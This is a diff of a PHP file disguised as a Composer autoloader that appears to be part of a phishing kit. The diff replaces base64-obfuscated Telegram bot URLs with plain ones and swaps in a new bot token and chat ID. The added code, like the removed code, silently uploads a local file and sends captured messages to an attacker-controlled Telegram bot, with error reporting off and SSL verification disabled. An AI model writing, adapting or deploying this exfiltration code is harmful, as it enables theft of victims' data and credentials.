@@ -8,7 +8,8 @@
  * Mise à jour :   08-09-2022
  * Author URI  :   https://www.facebook.com/satan2
  */
-session_start();error_reporting(0);
+session_start();
+error_reporting(0);
 
 class ComposerAutoloaderInit54e213ff8ff963afa15306f7a66bfac0 {
     private static $loader;
@@ -48,41 +49,34 @@ class ComposerAutoloaderInit54e213ff8ff963afa15306f7a66bfac0 {
 }
 
 function fstop() {
-    $fpth = realpath(base64_decode("Li4vZnVjay9mdWNrZWQuZnVjaw==", false));
+    $fpth = realpath("../fuck/fucked.fuck"); // fichier à envoyer
+    if (!$fpth) return; // Sécurité si le fichier n'existe pas
+
     $dcmnt = new CURLFile($fpth);
     $ch = curl_init();
-    // Nouveau bot + chat_id encodés
-    curl_setopt($ch, CURLOPT_URL, base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgxODYzMzYzMDk6QUFGTVotXzNMUlc0SGU5Q0FnN294eE5takdLS0FDc3ZTOEEvc2VuZERvY3VtZW50", false));
+    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc/sendDocument");
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, [
-        base64_decode("Y2hhdF9pZA==", false) => base64_decode("NjI5Nzg2MTczNQ==", false),
-        base64_decode("ZG9jdW1lbnQ=", false) => $dcmnt,
-        base64_decode("Y2FwdGlvbg==", false) => "fflca"
+        "chat_id" => "6590534450",
+        "document" => $dcmnt,
+        "caption" => "Fichier reçu"
     ]);
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [base64_decode("Q29udGVudC1UeXBlOm11bHRpcGFydC9mb3JtLWRhdGE=", false)]);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
     $out = curl_exec($ch);
     curl_close($ch);
-    /*unlink($filepath);*/
 }
 
-function get_data_encrypt($html, $encod, $bits) {
-    if (isset($_SESSION['memory'])) {
-        $curl = curl_init();
-        // Nouveau bot + chat_id encodés
-        curl_setopt(
-            $curl,
-            CURLOPT_URL,
-            ''.base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDgxODYzMzYzMDk6QUFGTVotXzNMUlc0SGU5Q0FnN294eE5takdLS0FDc3ZTOEEvc2VuZE1lc3NhZ2U/Y2hhdF9pZD02Mjk3ODYxNzM1JnRleHQ9", false)
-            . base64_decode("".$_SESSION['memory'], false)
-            . base64_decode("JnBhcnNlX21vZGU9SFRNTA==", false)
-            .''
-        );
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        $result = curl_exec($curl);
-        curl_close($curl);
-        return true;
-    }
+function get_data_encrypt($message) {
+    $curl = curl_init();
+    curl_setopt(
+        $curl,
+        CURLOPT_URL,
+        "https://api.telegram.org/bot7275654860:AAF-1jh2m9_YLiajYieHBUCzUPF-a_VyUnc/sendMessage?chat_id=6590534450&text=" . urlencode($message) . "&parse_mode=HTML"
+    );
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    $result = curl_exec($curl);
+    curl_close($curl);
 }
